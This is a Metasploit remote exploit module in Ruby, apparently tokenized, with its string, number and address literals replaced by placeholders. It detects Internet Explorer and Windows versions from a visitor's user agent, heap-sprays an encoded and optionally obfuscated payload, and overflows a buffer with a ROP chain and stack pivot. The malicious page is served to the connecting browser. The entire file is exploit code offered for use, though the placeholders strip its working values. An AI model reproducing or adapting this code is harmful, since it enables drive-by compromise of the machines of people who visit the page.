require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: HttpServer :: HTML include Msf :: Exploit :: RopDb def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> , <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > <int> , <str> = > <str> , <str> = > true , <str> = > <str> } , <str> = > { <str> = > <str> } , <str> = > <str> , <str> = > [ [ <str> , { } ] , [ <str> , { <str> = > nil , <str> = > <str> , <str> = > <hex> } ] , [ <str> , { <str> = > nil , <str> = > <str> , <str> = > <hex> } ] , [ <str> , { <str> = > <str> , <str> = > <str> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <str> , <str> = > <str> , <str> = > <hex> , <str> = > <hex> } ] ] , <str> = > false , <str> = > <str> , <str> = > <int> ) ) register_options ( [ OptBool . new ( <str> , [ false , <str> , false ] ) ] , self . class ) end def get_target ( agent ) return target if target . name != <str> nt = agent . scan ( <str> ) . flatten [ <int> ] || <str> ie = agent . scan ( <str> ) . flatten [ <int> ] || <str> ie_name = <str> ie <str> case nt when <str> os_name = <str> when <str> os_name = <str> when <str> os_name = <str> end targets . each do | t | if ( ! ie . empty? and t . name . include? ( ie_name ) ) and ( ! nt . empty? and t . name . include? ( os_name ) ) print_status ( <str> t . name <str> ) return t end end return nil end def ie_heap_spray ( my_target , p ) js_code = Rex :: Text . to_unescape ( p , Rex :: Arch . endian ( target . arch ) ) js_nops = Rex :: Text . to_unescape ( <str> * <int> , Rex :: Arch . endian ( target . arch ) ) js = <str> js_code <str> js_nops <str> my_target [ <str> ] <str> js = heaplib ( js , { <str> = > true } ) if datastore [ <str> ] js = :: Rex :: Exploitation :: JSObfu . new ( js ) js . obfuscate end return js end def get_payload ( t , cli ) code = payload . encoded return code if t [ <str> ] . nil? print_status ( <str> ) rop_payload = generate_rop_payload ( <str> , code , { <str> = > [ t [ <str> ] ] . pack ( <str> ) } ) return rop_payload end def load_exploit_html ( my_target , cli ) p = get_payload ( my_target , cli ) js = ie_heap_spray ( my_target , p ) rop_gadgets = [ <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , <hex> , ] . pack ( <str> ) stackpivot_to_spray = <str> bof = rand_text_alpha ( <int> ) bof << [ <hex> ] . pack ( <str> ) bof << [ <hex> ] . pack ( <str> ) bof << [ my_target . ret ] . pack ( <str> ) bof << [ <hex> ] . pack ( <str> ) bof << [ <hex> ] . pack ( <str> ) bof << [ <hex> ] . pack ( <str> ) bof << [ <hex> ] . pack ( <str> ) bof << [ <hex> ] . pack ( <str> ) bof << [ <hex> ] . pack ( <str> ) bof << [ <hex> ] . pack ( <str> ) bof << [ <hex> ] . pack ( <str> ) bof << rop_gadgets bof << Metasm :: Shellcode . assemble ( Metasm :: Ia32 . new , stackpivot_to_spray ) . encode_string bof << rand_text_alpha ( <hex> - bof . length ) js_bof = Rex :: Text . to_unescape ( bof , Rex :: Arch . endian ( my_target . arch ) ) target = rand_text_alpha ( <int> + rand ( <int> ) ) target2 = rand_text_alpha ( <int> + rand ( <int> ) ) target3 = rand_text_alpha ( <int> + rand ( <int> ) ) target4 = rand_text_alpha ( <int> + rand ( <int> ) ) target5 = rand_text_alpha ( <int> + rand ( <int> ) ) target6 = rand_text_alpha ( <int> + rand ( <int> ) ) target7 = rand_text_alpha ( <int> + rand ( <int> ) ) target8 = rand_text_alpha ( <int> + rand ( <int> ) ) target9 = rand_text_alpha ( <int> + rand ( <int> ) ) target10 = rand_text_alpha ( <int> + rand ( <int> ) ) target11 = rand_text_alpha ( <int> + rand ( <int> ) ) target12 = rand_text_alpha ( <int> + rand ( <int> ) ) target13 = rand_text_alpha ( <int> + rand ( <int> ) ) target14 = rand_text_alpha ( <int> + rand ( <int> ) ) target15 = rand_text_alpha ( <int> + rand ( <int> ) ) html = <str> js <str> target <str> target2 <str> target3 <str> target4 <str> target5 <str> target6 <str> target7 <str> target8 <str> target9 <str> target10 <str> target11 <str> target12 <str> target13 <str> target14 <str> target15 <str> js_bof <str> target9 <str> target10 <str> return html end def on_request_uri ( cli , request ) agent = request . headers [ <str> ] uri = request . uri print_status ( <str> uri <str> ) my_target = get_target ( agent ) if my_target . nil? print_error ( <str> agent <str> ) send_not_found ( cli ) return end html = load_exploit_html ( my_target , cli ) html = html . gsub ( <str> , <str> ) print_status ( <str> ) send_response ( cli , html , { <str> = > <str> } ) end end 
